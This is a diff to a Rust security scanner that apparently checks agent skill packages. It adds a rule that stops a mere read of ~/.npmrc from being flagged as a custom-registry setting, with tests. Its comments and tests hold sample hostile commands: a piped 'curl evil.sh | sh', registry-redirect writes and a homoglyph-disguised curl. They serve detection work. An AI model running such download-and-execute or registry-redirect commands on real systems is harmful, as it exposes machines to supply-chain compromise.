@@ -785,6 +785,10 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str, executable: bool) -
                 || line.contains("registry.yarnpkg.com")
                 || line.contains("crates.io")
                 || doc_in_docs
+                // Naming `.npmrc` is not pointing npm at anything: `cat
+                // ~/.npmrc` reads the operator's own configuration. Only a
+                // *write* to it sets a registry (rev 29).
+                || (m == ".npmrc" && !writes_to(&line, &m))
         }
         // A test asserts *about* a pattern; it does not perform it. GOLD-v4:
         // `expect(tokenizeArgs("... curl evil.sh | sh"))` and
@@ -1886,6 +1890,30 @@ mod tests {
         assert!(!hits(&scan_skill(&d)).contains("OBFUSC_HOMOGLYPH"));
         fs::write(d.join("scripts/b.sh"), "\u{0441}url https://x\n").unwrap_or_default();
         assert!(hits(&scan_skill(&d)).contains("OBFUSC_HOMOGLYPH"));
+    }
+
+    /// rev 29: naming `.npmrc` is not pointing npm at a registry. `cat
+    /// ~/.npmrc` reads the operator's config; only a write sets one.
+    #[test]
+    fn naming_npmrc_is_not_a_custom_registry() {
+        assert!(suppress_match(
+            "DEP_CUSTOM_REGISTRY",
+            "cat ~/.npmrc 2>/dev/null || echo \"no ~/.npmrc\"",
+            ".npmrc",
+            true
+        ));
+        assert!(!suppress_match(
+            "DEP_CUSTOM_REGISTRY",
+            "echo \"registry=https://mirror.example.com\" > ~/.npmrc",
+            ".npmrc",
+            true
+        ));
+        assert!(!suppress_match(
+            "DEP_CUSTOM_REGISTRY",
+            "--extra-index-url https://packages.vendor-mirror.example.net/simple",
+            "--extra-index-url ",
+            true
+        ));
     }
 
     /// rev 27: the private-address exclusion in `DL_UNTRUSTED_DOMAIN` compared
